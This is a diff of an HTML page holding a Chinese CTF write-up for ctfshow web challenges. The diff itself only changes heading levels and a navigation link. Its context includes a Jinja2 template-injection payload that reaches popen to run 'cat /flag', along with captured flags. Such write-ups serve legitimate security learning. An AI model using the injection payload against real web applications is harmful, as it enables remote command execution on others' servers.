@@ -131,7 +131,7 @@
 <p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042354502.png" alt="image-20230404235248682"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;Th1s_i5_f1ag&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p>是个base64编码之后传值到img显示图片</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h3><p>是个base64编码之后传值到img显示图片</p>
 <p>把index.php base64后传进去得到flag</p>
 <p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042357547.png" alt="image-20230404235735530"></p>
 <p>解码得到内容</p>
@@ -195,7 +195,7 @@
 <h4 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h4><p>官方给的题解</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hello/&#123;&#123; &quot;&quot;.__class__.__base__ .__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](request.args.get(&quot;ctfshow&quot;)).read()&#125;&#125;ge?ctfshow=cat /flag </span><br></pre></td></tr></table></figure>
 
-<h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>打开是个登陆页面，用sqlmap也爆不出来，就尝试直接注册登陆看看内容</p>
+<h3 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h3><p>打开是个登陆页面，用sqlmap也爆不出来，就尝试直接注册登陆看看内容</p>
 <p>登陆进去提示我的角色是user，当角色是admin的时候会给出东西</p>
 <p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051204342.png" alt="image-20230405120423293"></p>
 <p>再看看learn的内容</p>
@@ -224,7 +224,7 @@
 <p>得到flag</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;d7cbfb77-b2fb-47ee-ade9-e78bd40c9871&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h2><p>一把梭脚本</p>
+<h3 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h3><p>一把梭脚本</p>
 <p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051240312.png" alt="image-20230405124031283"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;yu_ren_j1e_haPpy!!!&#125;</span><br></pre></td></tr></table></figure>
 
@@ -303,9 +303,9 @@
       </a>
     
     
-      <a href="/2023/03/26/Cookie%E6%B3%A8%E5%85%A5/" class="article-nav-link">
+      <a href="/2023/02/16/%E6%B8%97%E9%80%8F-W1R3S/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">Cookie注入</div>
+        <div class="article-nav-title">渗透-W1R3S</div>
       </a>
     
   </nav>
